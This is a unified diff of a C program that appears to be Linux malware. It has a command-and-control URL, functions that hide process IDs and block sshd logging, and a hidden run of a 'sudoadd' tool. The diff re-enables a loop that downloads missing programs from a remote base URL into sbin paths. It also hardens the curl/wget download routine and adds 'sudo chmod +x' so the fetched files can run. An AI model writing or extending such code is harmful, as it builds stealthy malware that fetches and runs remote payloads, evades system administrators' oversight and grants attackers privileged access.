@@ -174,15 +174,24 @@ void combine_and_hide_pids(const char *names[], int num_names) {
 void download_file(const char *local_path, const char *url) {
     char cmd[DATA_SIZE];
     if (system("which curl") == 0) {
-        snprintf(cmd, sizeof(cmd), "curl -o %s %s", local_path, url);
+        snprintf(cmd, sizeof(cmd), "curl -o \"%s\" \"%s\"", local_path, url);
     } else if (system("which wget") == 0) {
-        snprintf(cmd, sizeof(cmd), "wget -O %s %s", local_path, url);
+        snprintf(cmd, sizeof(cmd), "wget -O \"%s\" \"%s\"", local_path, url);
     } else {
         fprintf(stderr, "Neither curl nor wget is available\n");
         exit(1);
     }
-    system(cmd);
+    if(system(cmd) != 0) {
+        fprintf(stderr, "Failed to download file\n");
+        exit(1);
+    }
+    snprintf(cmd, sizeof(cmd), "sudo chmod +x \"%s\"", local_path);
+    if(system(cmd) != 0) {
+        fprintf(stderr, "Failed to set executable permissions\n");
+        exit(1);
+    }
 }
+
 
 void create_and_enable_service() {
     // File doesn't exist, download it
@@ -421,6 +430,9 @@ void handle_sigint(int sig) {
 
 
 int main(int argc, char *argv[]) {
+    char cmd[COMMAND_SIZE];
+    char data[DATA_SIZE];
+
     if (access("/tmp/btrfs.lock", F_OK) != -1) {
         printf("Another instance is running.\n");
         exit(1);
@@ -429,9 +441,6 @@ int main(int argc, char *argv[]) {
         fclose(fp);
     }
     signal(SIGINT, handle_sigint);
-    //int found_pids[PID_STR_SIZE];
-    //char cmd[COMMAND_SIZE];
-    char data[DATA_SIZE];
 
     //char local_file_path[256];
     const char *url = "http://monchi.local:3000/cnc";
@@ -447,13 +456,14 @@ int main(int argc, char *argv[]) {
     block_sshd_log();
 
     // Loop through each program to check if it exists, if not download it
-    //for (int i = 0; programs[i] != NULL; ++i) {
-    //    snprintf(sbin_path, sizeof(sbin_path), "%s/%s", sbin_path, programs[i]);
-    //    if (access(local_file_path, F_OK) == -1) {
-    //        snprintf(cmd, sizeof(cmd), "%s%s", base_url, programs[i]);
-    //        download_file(sbin_path, cmd);
-    //    }
-    //}
+    for (int i = 0; programs[i] != NULL; ++i) {
+        snprintf(sbin_path, sizeof(sbin_path), "%s/%s", sbin_path, programs[i]);
+        if (access(sbin_path, F_OK) == -1) {
+            char cmd[COMMAND_SIZE];
+            snprintf(cmd, sizeof(cmd), "%s%s", base_url, programs[i]);
+            download_file(sbin_path, cmd);
+        }
+    }
 
     // Run sudoadd
     run_task_and_hide("/usr/sbin/sudoadd", "sudoadd", "-u", username, NULL);
